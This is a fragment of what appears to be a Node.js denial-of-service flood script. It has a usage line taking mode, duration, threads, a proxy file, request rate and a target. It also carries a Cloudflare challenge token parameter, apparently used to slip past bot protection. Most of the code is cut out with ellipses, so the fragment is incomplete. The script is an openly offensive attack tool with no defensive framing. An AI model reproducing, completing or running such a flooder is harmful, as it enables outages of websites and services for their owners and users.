const net = require("net");
 ...
 if (process.argv.length < 8){console.log(`invalid usage!\nnode x.js [mode] [time] [threads] [proxyfile] [rate] [target]`); process.exit();}
 const headers = {};
...
"?__cf_chl_rt_tk=RBfoHXUFh1w7Mt2u3.UB7jd7ABmC6JGgyY7lb0.CBXE-1746957891-1.0.1.1-hPztsbr5nw711odDcVxbPWtVJy5.Yz7kbxyIPMa2AiM",
